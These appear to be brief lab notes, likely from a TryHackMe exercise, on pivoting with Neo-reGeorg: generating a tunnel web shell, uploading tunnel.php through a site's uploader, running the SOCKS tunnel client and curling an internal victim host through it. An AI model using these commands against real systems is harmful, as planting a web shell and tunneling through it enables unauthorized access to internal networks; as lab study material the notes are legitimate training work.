
```
cd /opt/Neo-reGeorg
python3 neoreg.py generate -k thm
```

Upload tunnel to pivot machine website: "neoreg_servers/tunnel.php"

Run tunnel:

	python3 neoreg.py -k thm -u http://10.10.165.241/uploader/files/tunnel.php

Run curl command:

	curl --socks5 127.0.0.1:1080 http://[Victim IP]:80
